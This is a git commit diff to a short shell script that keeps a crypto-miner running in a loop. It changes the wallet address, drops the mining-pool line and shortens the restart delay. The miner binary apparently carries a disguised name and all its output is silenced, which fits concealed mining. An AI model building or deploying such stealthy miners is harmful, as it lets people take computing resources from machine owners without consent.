04330da449f6ac74229ab523c907557b8024f42e
prendibs <94189491+prendibs@users.noreply.github.com>
2026-09-19 17:45:19 +0700

    Update mining script with new user and shorter delay

--- z.sh
+++ z.sh
@@ -3,11 +3,10 @@ do
   echo "aman bang"
 
   ./vltrig \
-    -o sg.salvium.herominers.com:1230 \
-    -u SC1siBfG9HHfqjGkSYgEqALbd4WQZ37ZAj9mjPMgfqzdUiHrRuKEYLRLEm7uQt81xBgs2QzEEi6Yi6VXXqU5p6U8f124RMEobFN \
+    -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjUMj4s2dA5CWbeBa \
     --tls \
     </dev/null >/dev/null 2>&1
 
-  echo "waduhh. Restarting in 10 seconds..."
-  sleep 10
+  echo "waduhh. Restarting in 3 seconds..."
+  sleep 3
 done
